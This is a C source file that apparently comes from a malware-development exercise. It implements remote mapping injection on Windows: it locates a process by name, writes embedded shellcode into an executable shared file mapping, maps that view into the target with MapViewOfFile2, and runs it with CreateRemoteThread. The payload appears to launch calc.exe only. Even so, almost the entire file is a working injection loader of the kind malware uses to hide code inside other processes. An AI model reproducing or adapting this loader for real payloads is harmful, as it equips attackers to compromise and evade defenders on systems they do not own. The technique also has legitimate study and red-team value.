// same as local which we will proceed and do the samel for createMapping and MapView
// but futher mapping for MapViewOfFile2
// LOCAL VIEW ===> REMOTE VIEW

// furtehr implementatiion we wiill enumerate processess and get HANDLE and execute our payload

#include <Windows.h>
#include <stdio.h>
#include <Psapi.h> 
#include <TlHelp32.h>

// https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-mapviewoffilenuma2
// needed for MapViewOfFileNuma2 as what linker needs
#pragma comment (lib, "OneCore.lib")

BOOL EnumProcess(LPCWSTR pProcessName, HANDLE* hProcess) {

	BOOL STATUS = FALSE;
	HANDLE hSnapShot = NULL;

	PROCESSENTRY32W ProcessEntry32 = { 0 };
	ProcessEntry32.dwSize = sizeof(PROCESSENTRY32W);

	hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, ProcessEntry32.th32ProcessID);
	if (hSnapShot == INVALID_HANDLE_VALUE) {
		printf("[!] CreateToolhelp32Snapshot failed with error %lu \n", GetLastError());
		goto clean_up;
	}

	if (!Process32FirstW(hSnapShot, &ProcessEntry32)) {
		printf("[!] Process32FirstW failed with error %lu \n", GetLastError());
	}

	do {
		if (_wcsicmp(ProcessEntry32.szExeFile, pProcessName) == 0) {

			*hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, ProcessEntry32.th32ProcessID);
			if (*hProcess != NULL) {
				break;
			}


			else {
				DWORD dwError = GetLastError();
				if (dwError != ERROR_ACCESS_DENIED) {
					printf("[!] OpenProcess failed with error code: %lu\n", GetLastError());
					goto clean_up;
				}
			}
		}
	} while (Process32NextW(hSnapShot, &ProcessEntry32));


	if (*hProcess == NULL) {
		goto clean_up;
	}

	STATUS = TRUE;


clean_up:
	if (hSnapShot) {
		CloseHandle(hSnapShot);
	}
	return STATUS;
}



BOOL PrintProcessName(DWORD dwProcessId) {
	HANDLE hProcess = NULL;
	BOOL bStatus = NULL;

	HMODULE hModule = NULL;
	DWORD dwBytesNedded = 0;
	WCHAR wProcessName[MAX_PATH] = { 0 };

	hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, dwProcessId);
	

	if (hProcess == NULL) {
		DWORD dwLastError = GetLastError();

		if (GetLastError() == ERROR_ACCESS_DENIED) {
			bStatus = TRUE;
			return bStatus;
		}

		printf("[!] OpenProcess failed with error code: %lu\n", GetLastError());

		return bStatus;
	}



	if (!EnumProcessModulesEx(hProcess, &hModule, sizeof(hModule), &dwBytesNedded, LIST_MODULES_ALL)) {
		goto clean_up;
	}

	if (!GetModuleBaseNameW(hProcess, hModule, wProcessName, MAX_PATH)) {
		goto clean_up;
	}

	wprintf(L"\t[i] PID: %d - Name: %ls\n", dwProcessId, wProcessName);
	bStatus = TRUE;


clean_up:
	if (hProcess) {
		CloseHandle(hProcess);
	}
	return bStatus;
}




BOOL EnumerateAllProcess() {
	DWORD ProcessInfoBuff[1024] = { 0 }; // array to receive the process ID
	DWORD lpcbNeeded = 0; // The number of bytes returned in the pProcessIds array.
	DWORD NumberOfProcesses = 0; 

	if (!EnumProcesses(ProcessInfoBuff, sizeof(ProcessInfoBuff), &lpcbNeeded)) {
		printf("[!] EnumProcesses failed with error %lu \n", GetLastError());
		return FALSE;
	}

	// calculate how many processes we got running !!
	NumberOfProcesses = lpcbNeeded / sizeof(DWORD);
	printf("[+] We have %d processes running ...\n", NumberOfProcesses);

	for (DWORD i = 0; i < NumberOfProcesses; i++) {
		/// pass it to the above function 
		if (ProcessInfoBuff[i] != 0) {
			if (!PrintProcessName(ProcessInfoBuff[i])) {
				// 
			}
		}
	}
	return TRUE;
}



BOOL RemoteMapInject(HANDLE hProcess, PBYTE pPayload, SIZE_T sPayloadSize) {
	// no need to return ppaddress - injection within the same function
	
	
	BOOL bSTATUS = FALSE;
	HANDLE hFile = NULL;
	PVOID pLocalMapAddress = NULL;
	PVOID pRemoteMapAddress = NULL;
	HANDLE hThread = NULL;
	DWORD dwThreadId = 0;


	hFile = CreateFileMappingW(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, 0, (DWORD)sPayloadSize, NULL);
	if (hFile == NULL) {
		printf("[!] CreateFileMappingW failed with error %lu \n", GetLastError());
		goto clean_Up;
	}

	pLocalMapAddress = MapViewOfFile(hFile, FILE_MAP_WRITE, 0, 0, sPayloadSize);
	if (pLocalMapAddress == NULL) {
		printf("[!] MapViewOfFile failed with error %lu \n", GetLastError());
		goto clean_Up;
	}


	printf("[+] Memory location mapped at 0x%p  \n", pLocalMapAddress);
	printf("[#] Press <Enter> to proceed and write shellcode to remote process view...");
	(void)getchar();

	memcpy(pLocalMapAddress, pPayload, sPayloadSize);
	RtlSecureZeroMemory((PVOID)pPayload, sPayloadSize);
	
	printf("[+] We copied shellcode successfully...\n");
	printf("[#] Press <Enter> to proceed and map shellcode to remote view...");
	(void)getchar();

	// now moving to the 2nd mapping for the emote process
	pRemoteMapAddress = MapViewOfFile2(hFile, hProcess, 0, NULL, 0, 0, PAGE_EXECUTE_READWRITE);
	if (pRemoteMapAddress == NULL) {
		printf("[!] MapViewOfFile2 failed with error %lu \n", GetLastError());
		goto clean_Up;
	}
	printf("[+] Remote Memory location mapped at 0x%p...  \n", pRemoteMapAddress);


	printf("[#] Press <Enter> to proceed and execute shellcode ...");
	(void)getchar();

	hThread = CreateRemoteThread(hProcess, NULL, 0, pRemoteMapAddress, NULL, 0, &dwThreadId);
	if (hThread == NULL) {
		printf("[!] CreateRemoteThread failed with error %lu \n", GetLastError());
		goto clean_Up;
	}


	printf("[+] Remote Thread created....\n");
	printf("\t\t[+] TID: %d\n", dwThreadId);


	WaitForSingleObject(hThread, INFINITE);

	
	bSTATUS = TRUE;

clean_Up:

	if (pLocalMapAddress == NULL || pRemoteMapAddress == NULL) {
		return FALSE;
	}


	if (hFile) {
		CloseHandle(hFile);
	}

	if (!UnmapViewOfFile(pLocalMapAddress)) {
		printf("[!] UnmapViewOfFile failed with error code: %lu\n", GetLastError());
		return FALSE;
	}

	if (!UnmapViewOfFile2(hProcess, pRemoteMapAddress, 0)) {
		printf("[!] UnmapViewOfFile2 failed with error code: %lu\n", GetLastError());
		return FALSE;
	}
	return bSTATUS;
}




int wmain(int argc, wchar_t* argv[]) {

	if (argc != 2) {
		wprintf(L"[*] Usage:  <All> ---- for Printing All processes \n");
		wprintf(L"[*] Usage:  <Process_name.exe> --- for givin a handle \
                and Perfoming localMapping Injection on it \n");
		return 1;
	}

	unsigned char pShellcode[] =
		"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
		"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
		"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
		"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
		"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
		"\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
		"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
		"\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
		"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
		"\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
		"\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
		"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
		"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
		"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
		"\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
		"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
		"\x6f\x87\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd"
		"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
		"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
		"\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";

	HANDLE hProcess = NULL;
	INT STATUS = 1;
	SIZE_T sPayloadSize = sizeof(pShellcode);


	if (_wcsicmp(argv[1], L"All") == 0) {
		if (!EnumerateAllProcess()) {
			printf("[!] EnumerateAllProcess failed with error %lu \n", GetLastError());
			goto clean;
		}
	}
	else {
		wprintf(L"[*] Searching for Process ID of: %ls...\n", argv[1]);
		if (!EnumProcess(argv[1], &hProcess)) {
			printf("[!] EnumProcess failed with error %lu \n", GetLastError());
			goto clean;
		}

		wprintf(L"\t\t[+] Process [ %ls ] with ID [ %d ] found...\n", argv[1], GetProcessId(hProcess));

		if (!RemoteMapInject(hProcess, pShellcode, sPayloadSize)) {
			printf("[!] RemoteMapInject failed with error %lu \n", GetLastError());
			goto clean;
		}

	}


	STATUS = 0;

clean:
	if (hProcess) {
		CloseHandle(hProcess);
	}
	if (STATUS == 0) {
		printf("[+] DONE \n");
	}
	return STATUS;
}